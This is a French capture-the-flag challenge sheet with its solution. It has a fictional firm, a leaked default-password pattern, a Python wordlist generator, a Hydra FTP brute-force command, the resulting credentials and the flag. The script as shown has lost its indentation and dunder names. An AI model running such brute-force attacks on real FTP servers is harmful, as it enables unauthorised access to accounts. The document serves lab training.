Titre : Brut force serveur FTP

Catégorie : Exploit

Equipe : Exploit

Personnes : Brandon C

Description - Enoncé :

Nom de l'entreprise : Immo Net

Date de création : 2003

Siège social : Paris, France

Activité : Gestion immobilière, location, vente

Nombre d'employés : 50

Responsable Administrateur réseau : Jean Dupont

Biographie

Jean Dupont est un administrateur réseau expérimenté avec plus de 10 ans d'expérience dans le domaine. Il est diplômé d'une école d'ingénieur en informatique et a travaillé pour plusieurs entreprises de tailles variées.

Il est responsable de la gestion du réseau informatique d'ImmoNet, qui comprend environ 100 ordinateurs et serveurs. Il est également responsable de la sécurité du réseau et de la mise en œuvre des politiques de sécurité de l'entreprise.

Rôle dans l'entreprise

Jean Dupont est un membre important de l'équipe d'ImmoNet. Il joue un rôle essentiel dans le fonctionnement de l'entreprise en assurant la disponibilité et la sécurité du réseau informatique.

Il est également responsable de la mise en place de nouveaux systèmes et technologies, ce qui contribue à l'innovation et à la compétitivité de l'entreprise.

Informations fictives

Jean Dupont est un passionné de sécurité informatique. Il est membre de plusieurs associations professionnelles de sécurité et participe régulièrement à des conférences et événements sur le sujet.

Il est également un joueur de tennis passionné et il participe à des tournois amateurs locaux.

Informations supplémentaires

Vous pouvez ajouter des informations supplémentaires sur l'entreprise et le responsable Administrateur réseau pour rendre le défi CTF plus difficile. Par exemple, vous pouvez :

Spécifier les systèmes et technologies utilisés par l'entreprise.
Donner des détails sur les politiques de sécurité de l'entreprise.
Mentionner des vulnérabilités connues dans les systèmes et technologies utilisés par l'entreprise.
Avec un peu de créativité, vous pouvez créer un défi CTF amusant et stimulant qui mettra les compétences des participants à l'épreuve.

Charte Informatique – Immo Net

Politique de Gestion des Mots de Passe

Objectif : Assurer la sécurité des informations confidentielles d'Immo Net en mettant en place des pratiques efficaces de gestion des mots de passe.

1. Complexité des Mots de Passe :

Les mots de passe doivent contenir au moins huit caractères.
Ils doivent inclure une combinaison de lettres majuscules, lettres minuscules, chiffres et caractères spéciaux.

1. Confidentialité et Non-Partage :

Les employés ne doivent jamais partager leur mot de passe avec des collègues ou des tiers.
Les mots de passe ne doivent pas être écrits ou stockés de manière non sécurisée.

1. Authentification à Deux Facteurs (2FA) :

L'utilisation de l'authentification à deux facteurs est fortement recommandée pour renforcer la sécurité des comptes.

A votre première connexion votre mot de passe est composé de votre nom - un Caractère Spécial - et un nombre aléatoire entre 1 et 50.
Il est important de vous rendre dans vos paramètres pour le changer après votre première connexion.
Votre nom d'utilisateur est simplement votre nom de famille.

Solution :

Il faut d'abord utiliser un IP Scanner pour trouver l'adresse du serveur FTP.  
Une fois son adresse trouver l'utilisation d'une VM Kali linux est obligatoire.  
Il faudra élaborer un dictionnaire de mot de passe grace aux infos trouver dans l'énoncer.  
A la fin on peux lire que le mot de passe par défaut est composé du nom de famille mais on ne sait pas si c'est avec ou sans majuscule, puis d'un caractère spécial et termine par un nombre entre 1 et 50.  
Pour le nom d'utilisateur on sait que c'est le nom de famille de l'utilisateur mais on ne sait pas si c'est avec ou sans majuscule.  
Pour générer le dictionnaire de mot de passe on peux mettre en place un script python, pour générer la liste avec nos information connu, (voir le script a la tout fin)

Une fois la liste créer on va utiliser l'outil Hydra pour test tous les mot de passe automatiquement (ça serais long de faire a la fin car il y a 3200 possibilité)

Pour faire le test il faudra utiliser la commande suivante : hydra -t 20 -l dupont -P test.txt -vV IPV4 ftp

en gros la commande va test par vague de 20 possibilité les mots de passe a partir de la liste text.txt sur le serveur ayant l'IP "IPV4" en protocol ftp et utilise l'identifiant dupont.

Il va tester tous les mots de passe jusqu'à arrivé au test "Dupont+37" qui va donner une connexion fonctionnel.

Il ne suffit plus que d'utiliser un logiciel comme filezila pour ce connecter au serveur ftp avec les identifiant suivant :

Hote = IPV4  
Nom d'utilisateur = dupont  
Mot de passe = Dupont+37  
Port = 21

Dans le serveur on peu retrouver un fichier cle admin.txt  
avec le flag a l'intérieur

Flag = 38VacfEtRT7aT45yM3

Docker file : NON

Script python

```
Script python

import itertools
import string

def bruteforce_password():
username_prefixes = ["Dupont", "dupont"]
characters = string.ascii_letters + string.digits + string.punctuation

password_list = []

for prefix in username_prefixes:
    for special, number in itertools.product(string.punctuation, map(str, range(1, 51))):
        password_attempt = prefix + special + number
        if 8 <= len(password_attempt) <= 9:
            password_list.append(password_attempt)

return password_list

def write_to_file(passwords, filename="test.txt"):
with open(filename, "w") as file:
for password in passwords:
file.write(password + "\n")

if name == "main":
generated_passwords = bruteforce_password()
write_to_file(generated_passwords)
print(f"Generated {len(generated_passwords)} passwords. Check test.txt.")
```